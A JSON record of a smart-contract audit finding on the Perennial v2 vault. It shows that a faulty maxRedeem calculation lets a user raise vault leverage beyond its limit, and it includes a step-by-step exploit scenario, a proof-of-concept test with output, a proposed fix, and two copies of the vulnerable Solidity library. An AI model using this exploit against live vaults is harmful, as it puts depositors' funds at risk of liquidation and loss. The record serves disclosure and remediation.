{
  "Title": "H-2: Vault leverage can be increased to any value up to min margin requirement due to incorrect `maxRedeem` calculations with closable and `LEVERAGE_BUFFER`",
  "Content": "# Issue H-2: Vault leverage can be increased to any value up to min margin requirement due to incorrect `maxRedeem` calculations with closable and `LEVERAGE_BUFFER` \n\nSource: https://github.com/sherlock-audit/2023-10-perennial-judging/issues/7 \n\n## Found by \npanprog\n## Summary\n\nWhen redeeming from the vault, maximum amount allowed to be redeemed is limited by collateral required to keep the minimum vault position size which will remain open due to different factors, including `closable` value, which is a limitation on how much position can be closed given current pending positions. However, when calclulating max redeemable amount, `closable` value is multiplied by `LEVERAGE_BUFFER` value (currently 1.2):\n```solidity\nUFixed6 collateral = marketContext.currentPosition.maker\n    .sub(marketContext.currentPosition.net().min(marketContext.currentPosition.maker))  // available maker\n    .min(marketContext.closable.mul(StrategyLib.LEVERAGE_BUFFER))                       // available closable\n    .muldiv(marketContext.latestPrice.abs(), registration.leverage)                     // available collateral\n    .muldiv(totalWeight, registration.weight);                                          // collateral in market\n```\n\nThe intention seems to be to allow to withdraw a bit more collateral so that leverage can increase at max by LEVERAGE_BUFFER. However, the math is totally wrong here, for example:\n- Current position = 12, `closable = 10`\n- Max amount allowed to be redeemed is 12 (100% of shares)\n- However, when all shares are withdrawn, `closable = 10` prevents full position closure, so position will remain at 12-10 = 2\n- Once settled, user can claim all vault collateral while vault still has position of size 2 open. Claiming all collateral will revert due to this line in `allocate`:\n```solidity\n_locals.marketCollateral = strategy.marketContexts[marketId].margin\n    .add(collateral.sub(_locals.totalMargin).muldiv(registrations[marketId].weight, _locals.totalWeight));\n```\n\nSo the user can claim the assets only if remaining collateral is equal to or is greater than total margin of all markets. This means that user can put the vault into max leverage possible ignoring the vault leverage config (vault will have open position of such size, which will make all vault collateral equal the minimum margin requirement to open such position). This creates a big risk for vault liquidation and loss of funds for vault depositors.\n\n## Vulnerability Detail\n\nAs seen from the example above, it's possible to put the vault at high leverage only if user redeems amount higher than `closable` allows (redeem amount in the `closable`..`closable * LEVERAGE_BUFFER` range). However, since deposits and redeems from the vault are settled later, it's impossible to directly create such situation (redeemable amount > closable). There is still a way to create such situation indirectly via maker limit limitation.\n\nScenario:\n1. Market config leverage = 4. Existing deposits = $1K. Existing positions in underlying market are worth $4K\n2. Open maker position in underlying markets such that `makerLimit - currentMaker = $36K`\n3. Deposit $11K to the vault (total deposits = $12K). The vault will try to open position of size = $48K (+$44K), however `makerLimit` will not allow to open full position, so the vault will only open +$36K (total position $40K)\n4. Wait until the deposit settles\n5. Close maker position in underlying markets to free up maker limit\n6. Deposit minimum amount to the vault from another user. This increases vault positions to $48K (settled = $40K, pending = $48K, closable = $40K)\n7. Redeem $11K from the vault. This is possible, because maxRedeem is `closable/leverage*LEVERAGE_BUFFER` = `$40K/4*1.2` = `$12K`. However, the position will be limited by `closable`, so it will be reduced only by $40K (set to $8K).\n8. Wait until redeem settles\n9. Claim $11K from the vault. This leaves the vault with the latest position = $8K, but only with $1K of original deposit, meaning vault leverage is now 8 - twice the value specified by config (4).\n\nThis scenario will keep high vault leverage only for a short time until next oracle version, because `claim` will reduce position back to $4K, however this position reduction can also be avoided, for example, by opening/closing positions to make `long-short = maker` or `short-long = maker` in the underlying market(s), thus disallowing the vault to reduce its maker position and keeping the high leverage.\n\n## Impact\n\nMalicious user can put the vault at very high leverage, breaking important protocol invariant (leverage not exceeding target market leverage) and exposing the users to much higher potential funds loss / risk from the price movement due to high leverage and very high risk of vault liquidation, causing additional loss of funds from liquidation penalties and position re-opening fees.\n\n## Proof of concept\n\nThe scenario above is demonstrated in the test, add this to `Vault.test.ts`:\n```ts\nit('increase vault leverage', async () => {\n    console.log(\"start\");\n\n    async function setOracle(latestTime: BigNumber, currentTime: BigNumber) {\n    await setOracleEth(latestTime, currentTime)\n    await setOracleBtc(latestTime, currentTime)\n    }\n\n    async function setOracleEth(latestTime: BigNumber, currentTime: BigNumber) {\n    const [, currentPrice] = await oracle.latest()\n    const newVersion = {\n        timestamp: latestTime,\n        price: currentPrice,\n        valid: true,\n    }\n    oracle.status.returns([newVersion, currentTime])\n    oracle.request.whenCalledWith(user.address).returns()\n    oracle.latest.returns(newVersion)\n    oracle.current.returns(currentTime)\n    oracle.at.whenCalledWith(newVersion.timestamp).returns(newVersion)\n    }\n\n    async function setOracleBtc(latestTime: BigNumber, currentTime: BigNumber) {\n    const [, currentPrice] = await btcOracle.latest()\n    const newVersion = {\n        timestamp: latestTime,\n        price: currentPrice,\n        valid: true,\n    }\n    btcOracle.status.returns([newVersion, currentTime])\n    btcOracle.request.whenCalledWith(user.address).returns()\n    btcOracle.latest.returns(newVersion)\n    btcOracle.current.returns(currentTime)\n    btcOracle.at.whenCalledWith(newVersion.timestamp).returns(newVersion)\n    }\n\n    async function logLeverage() {\n    // vault collateral\n    var vaultCollateralEth = (await market.locals(vault.address)).collateral\n    var vaultCollateralBtc = (await btcMarket.locals(vault.address)).collateral\n    var vaultCollateral = vaultCollateralEth.add(vaultCollateralBtc)\n\n    // vault position\n    var vaultPosEth = (await market.positions(vault.address)).maker;\n    var ethPrice = (await oracle.latest()).price;\n    var vaultPosEthUsd = vaultPosEth.mul(ethPrice);\n    var vaultPosBtc = (await btcMarket.positions(vault.address)).maker;\n    var btcPrice = (await btcOracle.latest()).price;\n    var vaultPosBtcUsd = vaultPosBtc.mul(btcPrice);\n    var vaultPos = vaultPosEthUsd.add(vaultPosBtcUsd);\n    var leverage = vaultPos.div(vaultCollateral);\n    console.log(\"Vault collateral = \" + vaultCollateral.div(1e6) + \" pos = \" + vaultPos.div(1e12) + \" leverage = \" + leverage);\n    }\n\n    await setOracle(STARTING_TIMESTAMP.add(3600), STARTING_TIMESTAMP.add(3700))\n    await vault.settle(user.address);\n\n    // put markets at the (limit - 5000) each\n    var makerLimit = (await market.riskParameter()).makerLimit;\n    var makerCurrent = (await market.position()).maker;\n    var maker = makerLimit;\n    var ethPrice = (await oracle.latest()).price;\n    var availUsd = parse6decimal('32000'); // 10/2 * 4\n    var availToken = availUsd.mul(1e6).div(ethPrice);\n    maker = maker.sub(availToken);\n    var makerBefore = makerCurrent;// (await market.positions(user.address)).maker;\n    console.log(\"ETH Limit = \" + makerLimit + \" CurrentGlobal = \" + makerCurrent + \" CurrentUser = \" + makerBefore + \" price = \" + ethPrice + \" availToken = \" + availToken + \" maker = \" + maker);\n    for (var i = 0; i < 5; i++)\n        await fundWallet(asset, user);\n    await market.connect(user).update(user.address, maker, 0, 0, parse6decimal('1000000'), false)\n\n    var makerLimit = (await btcMarket.riskParameter()).makerLimit;\n    var makerCurrent = (await btcMarket.position()).maker;\n    var maker = makerLimit;\n    var btcPrice = (await btcOracle.latest()).price;\n    var availUsd = parse6decimal('8000'); // 10/2 * 4\n    var availToken = availUsd.mul(1e6).div(btcPrice);\n    maker = maker.sub(availToken);\n    var makerBeforeBtc = makerCurrent;// (await market.positions(user.address)).maker;\n    console.log(\"BTC Limit = \" + makerLimit + \" CurrentGlobal = \" + makerCurrent + \" CurrentUser = \" + makerBeforeBtc + \" price = \" + btcPrice + \" availToken = \" + availToken + \" maker = \" + maker);\n    for (var i = 0; i < 10; i++)\n        await fundWallet(asset, btcUser1);\n    await btcMarket.connect(btcUser1).update(btcUser1.address, maker, 0, 0, parse6decimal('2000000'), false)\n\n    console.log(\"market updated\");\n\n    var deposit = parse6decimal('12000')\n    await vault.connect(user).update(user.address, deposit, 0, 0)\n\n    await setOracle(STARTING_TIMESTAMP.add(3700), STARTING_TIMESTAMP.add(3800))\n    await vault.settle(user.address)\n\n    await logLeverage();\n\n    // withdraw the blocking amount\n    console.log(\"reduce maker blocking position to allow vault maker increase\")\n    await market.connect(user).update(user.address, makerBefore, 0, 0, 0, false);\n    await btcMarket.connect(btcUser1).update(btcUser1.address, makerBeforeBtc, 0, 0, 0, false);\n\n    await setOracle(STARTING_TIMESTAMP.add(3800), STARTING_TIMESTAMP.add(3900))\n\n    // refresh vault to increase position size since it's not held now\n    var deposit = parse6decimal('10')\n    console.log(\"Deposit small amount to increase position\")\n    await vault.connect(user2).update(user2.address, deposit, 0, 0)\n\n    // now redeem 11000 (which is allowed, but market position will be 2000 due to closable)\n    var redeem = parse6decimal('11500')\n    console.log(\"Redeeming 11500\")\n    await vault.connect(user).update(user.address, 0, redeem, 0);\n\n    // settle all changes\n    await setOracle(STARTING_TIMESTAMP.add(3900), STARTING_TIMESTAMP.add(4000))\n    await vault.settle(user.address)\n    await logLeverage();\n\n    // claim those assets we've withdrawn\n    var claim = parse6decimal('11100')\n    console.log(\"Claiming 11100\")\n    await vault.connect(user).update(user.address, 0, 0, claim);\n\n    await logLeverage();\n})\n```\n\nConsole log from execution of the code above:\n```solidity\nstart\nETH Limit = 1000000000 CurrentGlobal = 200000000 CurrentUser = 200000000 price = 2620237388 availToken = 12212633 maker = 987787367\nBTC Limit = 100000000 CurrentGlobal = 20000000 CurrentUser = 20000000 price = 38838362695 availToken = 205981 maker = 99794019\nmarket updated\nVault collateral = 12000 pos = 39999 leverage = 3333330\nreduce maker blocking position to allow vault maker increase\nDeposit small amount to increase position\nRedeeming 11500\nVault collateral = 12010 pos = 8040 leverage = 669444\nClaiming 11100\nVault collateral = 910 pos = 8040 leverage = 8835153\n```\n\n## Code Snippet\n\n`maxRedeem` limits redeem amount by `closable * LEVERAGE_BUFFER`:\nhttps://github.com/sherlock-audit/2023-10-perennial/blob/main/perennial-v2/packages/perennial-vault/contracts/lib/StrategyLib.sol#L94-L98\n\n`_positionLimit` calculates minimum possible position by reducing current position by max of `closable`:\nhttps://github.com/sherlock-audit/2023-10-perennial/blob/main/perennial-v2/packages/perennial-vault/contracts/lib/StrategyLib.sol#L219-L224\n\nThe difference in these values allows to keep high position while withdrawing more collateral than needed to target leverage.\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nThe formula to allow LEVERAGE_BUFFER should apply it to **final** position size, not to **delta** position size (`maxRedeem` returns delta to subtract from current position). Currently redeem amount it limited by: `closable * LEVERAGE_BUFFER`. Once subtracted from the current position size, we obtain:\n\n- `maxRedeem = closable * LEVERAGE_BUFFER / leverage`\n- `newPosition = currentPosition - closable`\n- `newCollateral = (currentPosition - closable * LEVERAGE_BUFFER) / leverage`\n- `newLeverage = newPosition / newCollateral = leverage * (currentPosition - closable) / (currentPosition - closable * LEVERAGE_BUFFER)`\n- `= leverage / (1 - (LEVERAGE_BUFFER - 1) * closable / (currentPosition - closable))`\n\nAs can be seen, the new leverage can be any amount and the formula doesn't make much sense, it certainly doesn't limit new leverage factor to LEVERAGE_BUFFER (denominator can be 0, negative or any small value, meaning leverage can be any number as high as you want). I think what developers wanted, is to have:\n- `newPosition = currentPosition - closable`\n- `newCollateral = newPosition / (leverage * LEVERAGE_BUFFER)`\n- `newLeverage = newPosition / (newPosition / (leverage * LEVERAGE_BUFFER)) = leverage * LEVERAGE_BUFFER`\n\nNow, the important part to understand is that it's impossible to calculate delta collateral simply from delta position like it is now. When we know target newPosition, we can calculate target newCollateral, and then maxRedeem (delta collateral) can be calculated as `currentCollateral - newCollateral`:\n- `maxRedeem = currentCollateral - newCollateral`\n- `maxRedeem = currentCollateral - newPosition / (leverage * LEVERAGE_BUFFER)`\n\nSo the fixed collateral calculation can be something like that:\n\n```solidity\nUFixed6 deltaPosition = marketContext.currentPosition.maker\n    .sub(marketContext.currentPosition.net().min(marketContext.currentPosition.maker))  // available maker\n    .min(marketContext.closable);\nUFixed6 targetPosition = marketContext.currentAccountPosition.maker.sub(deltaPosition); // expected ideal position\nUFixed6 targetCollateral = targetPosition.muldiv(marketContext.latestPrice.abs(), \n    registration.leverage.mul(StrategyLib.LEVERAGE_BUFFER));                            // allow leverage to be higher by LEVERAGE_BUFFER\nUFixed6 collateral = marketContext.local.collateral.sub(targetCollateral)               // delta collateral\n    .muldiv(totalWeight, registration.weight);                                          // market collateral => vault collateral\n```\n\n\n\n## Discussion\n\n**kbrizzle**\n\nThis was patched in our v2.0 deployment via https://github.com/equilibria-xyz/perennial-v2/pull/156.\n\nWe will follow up with the v2.1 fix as well, since it's materially different.\n\n",
  "Impact": "HIGH",
  "Source": "https://app.sherlock.xyz/audits/contests/123",
  "Code": [
    {
      "filename": "perennial-v2/packages/perennial-vault/contracts/lib/StrategyLib.sol",
      "content": "// SPDX-License-Identifier: Apache-2.0\npragma solidity ^0.8.13;\n\nimport \"../types/Registration.sol\";\n\n/// @dev The context of an underlying market\nstruct MarketStrategyContext {\n    /// @dev The market parameter set\n    MarketParameter marketParameter;\n\n    /// @dev The risk parameter set\n    RiskParameter riskParameter;\n\n    /// @dev The local state of the vault\n    Local local;\n\n    /// @dev The vault's current account position\n    Position currentAccountPosition;\n\n    /// @dev The vault's latest account position\n    Position latestAccountPosition;\n\n    /// @dev The current global position\n    Position currentPosition;\n\n    /// @dev The latest valid price\n    Fixed6 latestPrice;\n\n    /// @dev The margin requirement of the vault\n    UFixed6 margin;\n\n    /// @dev The current closable amount of the vault\n    UFixed6 closable;\n}\n\nstruct Strategy {\n    MarketStrategyContext[] marketContexts;\n}\nusing StrategyLib for Strategy global;\n\n/// @title Strategy\n/// @notice Logic for vault capital allocation\n/// @dev - Deploys collateral first to satisfy the margin of each market, then deploys the rest by weight.\n///      - Positions are then targeted based on the amount of collateral that ends up deployed to each market.\nlibrary StrategyLib {\n    /// @dev The maximum multiplier that is allowed for leverage\n    UFixed6 public constant LEVERAGE_BUFFER = UFixed6.wrap(1.2e6);\n\n    /// @dev The target allocation for a market\n    struct MarketTarget {\n        /// @dev The amount of change in collateral\n        Fixed6 collateral;\n\n        /// @dev The new position\n        UFixed6 position;\n    }\n\n    /// @dev Internal struct to avoid stack to deep error\n    struct _AllocateLocals {\n        UFixed6 marketCollateral;\n        UFixed6 marketAssets;\n        UFixed6 minPosition;\n        UFixed6 maxPosition;\n        UFixed6 minAssets;\n        uint256 totalWeight;\n        UFixed6 totalMargin;\n    }\n\n    function load(Registration[] memory registrations) internal view returns (Strategy memory strategy) {\n        strategy.marketContexts = new MarketStrategyContext[](registrations.length);\n        for (uint256 marketId; marketId < registrations.length; marketId++)\n            strategy.marketContexts[marketId] = _loadContext(registrations[marketId]);\n    }\n\n    function maxRedeem(\n        Strategy memory strategy,\n        Registration[] memory registrations,\n        uint256 totalWeight\n    ) internal pure returns (UFixed6 redemptionAssets) {\n        redemptionAssets = UFixed6Lib.MAX;\n        for (uint256 marketId; marketId < strategy.marketContexts.length; marketId++) {\n            MarketStrategyContext memory marketContext = strategy.marketContexts[marketId];\n            Registration memory registration = registrations[marketId];\n\n            // If market has 0 weight, leverage, or position, skip\n            if (\n                registration.weight == 0 ||\n                registration.leverage.isZero() || (\n                    marketContext.latestAccountPosition.maker.isZero() &&\n                    marketContext.currentAccountPosition.maker.isZero()\n                )\n            ) continue;\n\n            UFixed6 collateral = marketContext.currentPosition.maker\n                .sub(marketContext.currentPosition.net().min(marketContext.currentPosition.maker))  // available maker\n                .min(marketContext.closable.mul(StrategyLib.LEVERAGE_BUFFER))                       // available closable\n                .muldiv(marketContext.latestPrice.abs(), registration.leverage)                     // available collateral\n                .muldiv(totalWeight, registration.weight);                                          // collateral in market\n\n            redemptionAssets = redemptionAssets.min(collateral);\n        }\n    }\n\n    /// @notice Compute the target allocation for each market\n    /// @param strategy The strategy of the vault\n    /// @param registrations The registrations of the markets\n    /// @param collateral The amount of collateral to allocate\n    /// @param assets The amount of collateral that is eligible for positions\n    function allocate(\n        Strategy memory strategy,\n        Registration[] memory registrations,\n        UFixed6 collateral,\n        UFixed6 assets\n    ) internal pure returns (MarketTarget[] memory targets) {\n        _AllocateLocals memory _locals;\n        (_locals.totalWeight, _locals.totalMargin) = _aggregate(registrations, strategy.marketContexts);\n\n        targets = new MarketTarget[](registrations.length);\n        for (uint256 marketId; marketId < registrations.length; marketId++) {\n\n            _locals.marketCollateral = strategy.marketContexts[marketId].margin\n                .add(collateral.sub(_locals.totalMargin).muldiv(registrations[marketId].weight, _locals.totalWeight));\n\n            _locals.marketAssets = assets\n                .muldiv(registrations[marketId].weight, _locals.totalWeight)\n                .min(_locals.marketCollateral.mul(LEVERAGE_BUFFER));\n\n            _locals.minAssets = strategy.marketContexts[marketId].riskParameter.minMargin\n                .unsafeDiv(registrations[marketId].leverage.mul(strategy.marketContexts[marketId].riskParameter.maintenance));\n            if (strategy.marketContexts[marketId].marketParameter.closed || _locals.marketAssets.lt(_locals.minAssets))\n                _locals.marketAssets = UFixed6Lib.ZERO;\n\n            (_locals.minPosition, _locals.maxPosition) = _positionLimit(strategy.marketContexts[marketId]);\n\n            (targets[marketId].collateral, targets[marketId].position) = (\n                Fixed6Lib.from(_locals.marketCollateral).sub(strategy.marketContexts[marketId].local.collateral),\n                _locals.marketAssets\n                    .muldiv(registrations[marketId].leverage, strategy.marketContexts[marketId].latestPrice.abs())\n                    .min(_locals.maxPosition)\n                    .max(_locals.minPosition)\n            );\n        }\n    }\n\n    /// @notice Load the context of a market\n    /// @param registration The registration of the market\n    /// @return marketContext The context of the market\n    function _loadContext(Registration memory registration) private view returns (MarketStrategyContext memory marketContext) {\n        marketContext.marketParameter = registration.market.parameter();\n        marketContext.riskParameter = registration.market.riskParameter();\n        marketContext.local = registration.market.locals(address(this));\n        Global memory global = registration.market.global();\n        marketContext.latestPrice = global.latestPrice;\n\n        // latest position\n        UFixed6 previousClosable;\n        previousClosable = _loadPosition(\n            marketContext,\n            marketContext.latestAccountPosition = registration.market.positions(address(this)),\n            previousClosable\n        );\n        marketContext.closable = marketContext.latestAccountPosition.maker;\n\n        // pending positions\n        for (uint256 id = marketContext.local.latestId + 1; id <= marketContext.local.currentId; id++)\n            previousClosable = _loadPosition(\n                marketContext,\n                marketContext.currentAccountPosition = registration.market.pendingPositions(address(this), id),\n                previousClosable\n            );\n\n        // current position\n        Position memory latestPosition = registration.market.position();\n        marketContext.currentPosition = registration.market.pendingPosition(global.currentId);\n        marketContext.currentPosition.adjust(latestPosition);\n    }\n\n    /// @notice Loads one position for the context calculation\n    /// @param marketContext The context of the market\n    /// @param position The position to load\n    /// @param previousMaker The previous maker position\n    /// @return nextMaker The next maker position\n    function _loadPosition(\n        MarketStrategyContext memory marketContext,\n        Position memory position,\n        UFixed6 previousMaker\n    ) private pure returns (UFixed6 nextMaker) {\n        position.adjust(marketContext.latestAccountPosition);\n\n        marketContext.margin = position\n            .margin(OracleVersion(0, marketContext.latestPrice, true), marketContext.riskParameter)\n            .max(marketContext.margin);\n        marketContext.closable = marketContext.closable.sub(previousMaker.sub(position.maker.min(previousMaker)));\n        nextMaker = position.maker;\n    }\n\n    /// @notice Aggregate the context of all markets\n    /// @param registrations The registrations of the markets\n    /// @param marketContexts The contexts of the markets\n    /// @return totalWeight The total weight of all markets\n    /// @return totalMargin The total margin of all markets\n    function _aggregate(\n        Registration[] memory registrations,\n        MarketStrategyContext[] memory marketContexts\n    ) private pure returns (uint256 totalWeight, UFixed6 totalMargin) {\n        for (uint256 marketId; marketId < registrations.length; marketId++) {\n            totalWeight += registrations[marketId].weight;\n            totalMargin = totalMargin.add(marketContexts[marketId].margin);\n        }\n    }\n\n    /// @notice Compute the position limit of a market\n    /// @param marketContext The context of the market\n    /// @return The minimum position size before crossing the net position\n    /// @return The maximum position size before crossing the maker limit\n    function _positionLimit(MarketStrategyContext memory marketContext) private pure returns (UFixed6, UFixed6) {\n        return (\n            // minimum position size before crossing the net position\n            marketContext.currentAccountPosition.maker.sub(\n            marketContext.currentPosition.maker\n                    .sub(marketContext.currentPosition.net().min(marketContext.currentPosition.maker))\n                    .min(marketContext.currentAccountPosition.maker)\n                    .min(marketContext.closable)\n            ),\n            // maximum position size before crossing the maker limit\n            marketContext.currentAccountPosition.maker.add(\n            marketContext.riskParameter.makerLimit\n                    .sub(marketContext.currentPosition.maker.min(marketContext.riskParameter.makerLimit))\n            )\n        );\n    }\n}"
    },
    {
      "filename": "perennial-v2/packages/perennial-vault/contracts/lib/StrategyLib.sol",
      "content": "// SPDX-License-Identifier: Apache-2.0\npragma solidity ^0.8.13;\n\nimport \"../types/Registration.sol\";\n\n/// @dev The context of an underlying market\nstruct MarketStrategyContext {\n    /// @dev The market parameter set\n    MarketParameter marketParameter;\n\n    /// @dev The risk parameter set\n    RiskParameter riskParameter;\n\n    /// @dev The local state of the vault\n    Local local;\n\n    /// @dev The vault's current account position\n    Position currentAccountPosition;\n\n    /// @dev The vault's latest account position\n    Position latestAccountPosition;\n\n    /// @dev The current global position\n    Position currentPosition;\n\n    /// @dev The latest valid price\n    Fixed6 latestPrice;\n\n    /// @dev The margin requirement of the vault\n    UFixed6 margin;\n\n    /// @dev The current closable amount of the vault\n    UFixed6 closable;\n}\n\nstruct Strategy {\n    MarketStrategyContext[] marketContexts;\n}\nusing StrategyLib for Strategy global;\n\n/// @title Strategy\n/// @notice Logic for vault capital allocation\n/// @dev - Deploys collateral first to satisfy the margin of each market, then deploys the rest by weight.\n///      - Positions are then targeted based on the amount of collateral that ends up deployed to each market.\nlibrary StrategyLib {\n    /// @dev The maximum multiplier that is allowed for leverage\n    UFixed6 public constant LEVERAGE_BUFFER = UFixed6.wrap(1.2e6);\n\n    /// @dev The target allocation for a market\n    struct MarketTarget {\n        /// @dev The amount of change in collateral\n        Fixed6 collateral;\n\n        /// @dev The new position\n        UFixed6 position;\n    }\n\n    /// @dev Internal struct to avoid stack to deep error\n    struct _AllocateLocals {\n        UFixed6 marketCollateral;\n        UFixed6 marketAssets;\n        UFixed6 minPosition;\n        UFixed6 maxPosition;\n        UFixed6 minAssets;\n        uint256 totalWeight;\n        UFixed6 totalMargin;\n    }\n\n    function load(Registration[] memory registrations) internal view returns (Strategy memory strategy) {\n        strategy.marketContexts = new MarketStrategyContext[](registrations.length);\n        for (uint256 marketId; marketId < registrations.length; marketId++)\n            strategy.marketContexts[marketId] = _loadContext(registrations[marketId]);\n    }\n\n    function maxRedeem(\n        Strategy memory strategy,\n        Registration[] memory registrations,\n        uint256 totalWeight\n    ) internal pure returns (UFixed6 redemptionAssets) {\n        redemptionAssets = UFixed6Lib.MAX;\n        for (uint256 marketId; marketId < strategy.marketContexts.length; marketId++) {\n            MarketStrategyContext memory marketContext = strategy.marketContexts[marketId];\n            Registration memory registration = registrations[marketId];\n\n            // If market has 0 weight, leverage, or position, skip\n            if (\n                registration.weight == 0 ||\n                registration.leverage.isZero() || (\n                    marketContext.latestAccountPosition.maker.isZero() &&\n                    marketContext.currentAccountPosition.maker.isZero()\n                )\n            ) continue;\n\n            UFixed6 collateral = marketContext.currentPosition.maker\n                .sub(marketContext.currentPosition.net().min(marketContext.currentPosition.maker))  // available maker\n                .min(marketContext.closable.mul(StrategyLib.LEVERAGE_BUFFER))                       // available closable\n                .muldiv(marketContext.latestPrice.abs(), registration.leverage)                     // available collateral\n                .muldiv(totalWeight, registration.weight);                                          // collateral in market\n\n            redemptionAssets = redemptionAssets.min(collateral);\n        }\n    }\n\n    /// @notice Compute the target allocation for each market\n    /// @param strategy The strategy of the vault\n    /// @param registrations The registrations of the markets\n    /// @param collateral The amount of collateral to allocate\n    /// @param assets The amount of collateral that is eligible for positions\n    function allocate(\n        Strategy memory strategy,\n        Registration[] memory registrations,\n        UFixed6 collateral,\n        UFixed6 assets\n    ) internal pure returns (MarketTarget[] memory targets) {\n        _AllocateLocals memory _locals;\n        (_locals.totalWeight, _locals.totalMargin) = _aggregate(registrations, strategy.marketContexts);\n\n        targets = new MarketTarget[](registrations.length);\n        for (uint256 marketId; marketId < registrations.length; marketId++) {\n\n            _locals.marketCollateral = strategy.marketContexts[marketId].margin\n                .add(collateral.sub(_locals.totalMargin).muldiv(registrations[marketId].weight, _locals.totalWeight));\n\n            _locals.marketAssets = assets\n                .muldiv(registrations[marketId].weight, _locals.totalWeight)\n                .min(_locals.marketCollateral.mul(LEVERAGE_BUFFER));\n\n            _locals.minAssets = strategy.marketContexts[marketId].riskParameter.minMargin\n                .unsafeDiv(registrations[marketId].leverage.mul(strategy.marketContexts[marketId].riskParameter.maintenance));\n            if (strategy.marketContexts[marketId].marketParameter.closed || _locals.marketAssets.lt(_locals.minAssets))\n                _locals.marketAssets = UFixed6Lib.ZERO;\n\n            (_locals.minPosition, _locals.maxPosition) = _positionLimit(strategy.marketContexts[marketId]);\n\n            (targets[marketId].collateral, targets[marketId].position) = (\n                Fixed6Lib.from(_locals.marketCollateral).sub(strategy.marketContexts[marketId].local.collateral),\n                _locals.marketAssets\n                    .muldiv(registrations[marketId].leverage, strategy.marketContexts[marketId].latestPrice.abs())\n                    .min(_locals.maxPosition)\n                    .max(_locals.minPosition)\n            );\n        }\n    }\n\n    /// @notice Load the context of a market\n    /// @param registration The registration of the market\n    /// @return marketContext The context of the market\n    function _loadContext(Registration memory registration) private view returns (MarketStrategyContext memory marketContext) {\n        marketContext.marketParameter = registration.market.parameter();\n        marketContext.riskParameter = registration.market.riskParameter();\n        marketContext.local = registration.market.locals(address(this));\n        Global memory global = registration.market.global();\n        marketContext.latestPrice = global.latestPrice;\n\n        // latest position\n        UFixed6 previousClosable;\n        previousClosable = _loadPosition(\n            marketContext,\n            marketContext.latestAccountPosition = registration.market.positions(address(this)),\n            previousClosable\n        );\n        marketContext.closable = marketContext.latestAccountPosition.maker;\n\n        // pending positions\n        for (uint256 id = marketContext.local.latestId + 1; id <= marketContext.local.currentId; id++)\n            previousClosable = _loadPosition(\n                marketContext,\n                marketContext.currentAccountPosition = registration.market.pendingPositions(address(this), id),\n                previousClosable\n            );\n\n        // current position\n        Position memory latestPosition = registration.market.position();\n        marketContext.currentPosition = registration.market.pendingPosition(global.currentId);\n        marketContext.currentPosition.adjust(latestPosition);\n    }\n\n    /// @notice Loads one position for the context calculation\n    /// @param marketContext The context of the market\n    /// @param position The position to load\n    /// @param previousMaker The previous maker position\n    /// @return nextMaker The next maker position\n    function _loadPosition(\n        MarketStrategyContext memory marketContext,\n        Position memory position,\n        UFixed6 previousMaker\n    ) private pure returns (UFixed6 nextMaker) {\n        position.adjust(marketContext.latestAccountPosition);\n\n        marketContext.margin = position\n            .margin(OracleVersion(0, marketContext.latestPrice, true), marketContext.riskParameter)\n            .max(marketContext.margin);\n        marketContext.closable = marketContext.closable.sub(previousMaker.sub(position.maker.min(previousMaker)));\n        nextMaker = position.maker;\n    }\n\n    /// @notice Aggregate the context of all markets\n    /// @param registrations The registrations of the markets\n    /// @param marketContexts The contexts of the markets\n    /// @return totalWeight The total weight of all markets\n    /// @return totalMargin The total margin of all markets\n    function _aggregate(\n        Registration[] memory registrations,\n        MarketStrategyContext[] memory marketContexts\n    ) private pure returns (uint256 totalWeight, UFixed6 totalMargin) {\n        for (uint256 marketId; marketId < registrations.length; marketId++) {\n            totalWeight += registrations[marketId].weight;\n            totalMargin = totalMargin.add(marketContexts[marketId].margin);\n        }\n    }\n\n    /// @notice Compute the position limit of a market\n    /// @param marketContext The context of the market\n    /// @return The minimum position size before crossing the net position\n    /// @return The maximum position size before crossing the maker limit\n    function _positionLimit(MarketStrategyContext memory marketContext) private pure returns (UFixed6, UFixed6) {\n        return (\n            // minimum position size before crossing the net position\n            marketContext.currentAccountPosition.maker.sub(\n            marketContext.currentPosition.maker\n                    .sub(marketContext.currentPosition.net().min(marketContext.currentPosition.maker))\n                    .min(marketContext.currentAccountPosition.maker)\n                    .min(marketContext.closable)\n            ),\n            // maximum position size before crossing the maker limit\n            marketContext.currentAccountPosition.maker.add(\n            marketContext.riskParameter.makerLimit\n                    .sub(marketContext.currentPosition.maker.min(marketContext.riskParameter.makerLimit))\n            )\n        );\n    }\n}"
    }
  ]
}